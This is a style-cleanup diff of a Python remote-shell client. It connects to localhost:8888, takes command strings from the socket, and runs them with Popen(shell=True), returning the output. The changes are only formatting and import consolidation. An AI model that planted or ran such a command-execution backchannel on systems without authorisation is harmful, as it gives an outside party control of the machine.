@@ -1,22 +1,16 @@
 # Import the necessary libraries
 
-from os import chdir
-from os import getcwd
-
-from subprocess import PIPE
-from subprocess import Popen
+from os import chdir, getcwd
 
 # Import the necessary functions from the socket library
-from socket import AF_INET
-from socket import error
-from socket import socket
-from socket import SOCK_STREAM
+from socket import AF_INET, SOCK_STREAM, error, socket
+from subprocess import PIPE, Popen
 
 # Uninitialised socket at client
 s = None
 
 # Standard host is initialised
-host = 'localhost'
+host = "localhost"
 
 # Standard port is initialised
 port = 8888
@@ -60,14 +54,14 @@ while True:
 
     # If the command to exit the shell is entered, exit the shell
     # Exiting the loop will prevent it from taking more commands
-    if data == 'exit':
+    if data == "exit":
 
         # Terminate the loop
         break
 
     # Since this is a command to change the directory to a new directory
     # The path of the shell needs to be changed, it is handled seperately
-    elif data[:2] == 'cd':
+    if data[:2] == "cd":
 
         # To store the necessary message for the user
         output_str = ""
@@ -103,7 +97,7 @@ while True:
         # All the arguments use PIPE as the standard streams need to opened
 
         # As the shell command needs to run as a full process, we create a child process and run it in that process
-        cmd = Popen(data[:], shell = True, stdout = PIPE, stdin = PIPE, stderr = PIPE)
+        cmd = Popen(data[:], shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE)
 
         # The output byte stream must consist of the standard output and standard error of the created child process
         output_byte = cmd.stdout.read() + cmd.stderr.read()
